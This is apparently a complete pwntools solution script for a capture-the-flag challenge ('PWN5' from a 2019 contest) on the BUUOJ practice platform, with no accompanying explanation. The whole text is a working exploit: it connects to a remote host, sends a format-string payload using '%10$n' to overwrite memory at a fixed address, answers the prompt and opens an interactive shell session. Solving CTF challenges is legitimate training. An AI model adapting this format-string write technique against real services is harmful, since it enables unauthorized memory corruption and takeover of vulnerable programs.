from pwn import *
context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','splitw','-h'])
# io=process("./[第五空间2019 决赛]PWN5")
io=remote("node4.buuoj.cn",26596)
bc_addr=0x804C044
payload=p32(bc_addr)+b"%10$n"
io.sendline(payload)
io.sendline(b"4")
io.interactive()

